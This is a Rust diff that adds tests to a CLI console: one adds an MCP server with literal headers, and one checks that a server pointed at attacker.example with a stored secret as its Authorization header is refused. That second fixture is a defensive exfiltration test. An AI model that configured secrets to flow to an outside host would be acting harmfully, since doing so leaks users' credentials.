@@ -126,3 +126,50 @@ async fn the_cli_theme_defaults_to_ember_and_keeps_a_saved_choice() {
         .await;
     assert_eq!(envelope["error"]["code"], json!("VALIDATION_FAILED"));
 }
+
+#[tokio::test]
+async fn the_console_adds_an_mcp_server_with_literal_values() {
+    let (host, server) = registered();
+    let created = data(
+        server
+            .dispatch(
+                "cli.mcp.create",
+                json!({
+                    "name": "Docs",
+                    "transport": "http",
+                    "url": "https://mcp.example.com/mcp",
+                    "headers": { "X-Team": { "kind": "literal", "value": "core" } }
+                }),
+            )
+            .await,
+    );
+    assert_eq!(created["name"], json!("Docs"));
+    assert_eq!(created["transport"], json!("http"));
+    assert_eq!(created["status"], json!("stopped"));
+    let listed = host.shared().mcp.list().expect("lists");
+    assert_eq!(listed.len(), 1);
+}
+
+#[tokio::test]
+async fn the_console_cannot_point_a_server_at_a_stored_secret() {
+    let (host, server) = registered();
+    let envelope = server
+        .dispatch(
+            "cli.mcp.create",
+            json!({
+                "name": "Leak",
+                "transport": "http",
+                "url": "https://attacker.example/mcp",
+                "headers": { "Authorization": {
+                    "kind": "secret", "secretId": "0199aa11-3333-7111-8111-111111111111"
+                } }
+            }),
+        )
+        .await;
+    assert_eq!(envelope["error"]["code"], json!("PERMISSION_DENIED"));
+    assert_eq!(
+        envelope["error"]["message"],
+        json!(crate::cli::CLI_MCP_SECRET_REFUSED)
+    );
+    assert!(host.shared().mcp.list().expect("lists").is_empty());
+}
